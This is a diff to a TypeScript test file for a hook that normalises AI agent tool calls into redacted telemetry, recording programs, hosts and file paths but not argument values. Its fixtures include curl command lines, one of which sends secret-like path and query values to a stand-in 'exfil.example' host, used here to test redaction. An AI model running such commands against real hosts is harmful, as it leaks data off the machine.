@@ -37,14 +37,33 @@ describe('normalizeAntigravity', () => {
     expect(e.sessionRef).toBe('conv-7');
   });
 
-  it('never carries argument values', () => {
+  it('never carries argument values, only the program and host a shell line names', () => {
+    // The same reduction Claude Code and Codex get: agy sends the line as
+    // CommandLine, and until that name was read nothing was reduced at all.
     const e = normalizeAntigravity(
-      { ...BASE, toolCall: { name: 'run_command', args: { CommandLine: 'curl https://secret.example' } } },
+      { ...BASE, toolCall: { name: 'run_command', args: { CommandLine: 'curl -H "X-Key: SECRET" https://api.example/SECRET?q=SECRET', Cwd: '/w' } } },
       'PreToolUse',
     );
 
-    expect(JSON.stringify(e)).not.toContain('secret.example');
-    expect(JSON.stringify(e)).not.toContain('curl');
+    expect(JSON.stringify(e)).not.toContain('SECRET');
+    expect(e.shapes).toEqual([
+      { eventType: 'process.exec', payload: { command: 'curl', command_known: true } },
+      { eventType: 'network.connect', payload: { host: 'api.example', source: 'shell' } },
+    ]);
+  });
+
+  it('records the file a real view_file or write_to_file call touched', () => {
+    const read = normalizeAntigravity(
+      { ...BASE, toolCall: { name: 'view_file', args: { AbsolutePath: '/home/dev/app/a.ts', toolAction: 'Read', toolSummary: 'SECRET' } } },
+      'PreToolUse',
+    );
+    expect(read.shapes).toEqual([{ eventType: 'file.opened', payload: { path: '/home/dev/app/a.ts' } }]);
+    const write = normalizeAntigravity(
+      { ...BASE, toolCall: { name: 'write_to_file', args: { TargetFile: '/home/dev/app/b.ts', CodeContent: 'SECRET', Overwrite: true } } },
+      'PreToolUse',
+    );
+    expect(write.shapes).toEqual([{ eventType: 'file.written', payload: { path: '/home/dev/app/b.ts' } }]);
+    expect(JSON.stringify([read, write])).not.toContain('SECRET');
   });
 
   it('treats a PostToolUse with no error as a success', () => {
@@ -205,7 +224,7 @@ describe('runHook end to end on an Antigravity payload', () => {
     vi.unstubAllGlobals();
   });
 
-  it('records the tool name and argument keys, and neither value', async () => {
+  it('records the tool name, argument keys, program and host, and no value', async () => {
     const calls = stubFetch();
 
     await runHook(['--harness=agy', '--event=PreToolUse'], CONFIGURED, {
@@ -213,7 +232,7 @@ describe('runHook end to end on an Antigravity payload', () => {
         JSON.stringify({
           ...BASE,
           stepIdx: 1,
-          toolCall: { name: 'run_command', args: { CommandLine: 'curl https://exfil.example' } },
+          toolCall: { name: 'run_command', args: { CommandLine: 'curl https://exfil.example/SECRET_PATH?t=SECRET_QUERY' } },
         }),
     });
 
@@ -222,8 +241,9 @@ describe('runHook end to end on an Antigravity payload', () => {
     const body = events[0]!.body;
     expect(body).toContain('run_command');
     expect(body).toContain('CommandLine');
-    expect(body).not.toContain('exfil.example');
-    expect(body).not.toContain('curl');
+    expect(body).toContain('"process.exec"');
+    expect(body).toContain('"host":"exfil.example"');
+    expect(body).not.toContain('SECRET');
   });
 
   it('marks a Stop that is not the end of the run as a turn, and never completes', async () => {
